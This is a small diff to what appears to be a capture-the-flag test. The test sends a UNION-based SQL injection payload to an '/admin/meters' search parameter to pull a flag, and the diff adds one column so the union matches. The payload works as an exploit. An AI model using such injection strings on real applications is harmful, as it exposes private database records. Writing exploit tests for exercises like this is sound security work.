@@ -4,7 +4,7 @@
 
 
 def test_sqli_teach_admin_meters(ops1_admin, base_url, extract_flag_fn, redeem_flag_fn):
-    payload = "zzz' UNION SELECT id,meter_code,user_id,nickname,status,balance,created_at,0,0 FROM meters--"
+    payload = "zzz' UNION SELECT id,meter_code,user_id,nickname,status,balance,created_at,0,0,0 FROM meters--"
     resp = ops1_admin.get(f"{base_url}/admin/meters", params={"q": payload}, timeout=10)
     assert resp.status_code == 200
     flag = extract_flag_fn(resp.text)
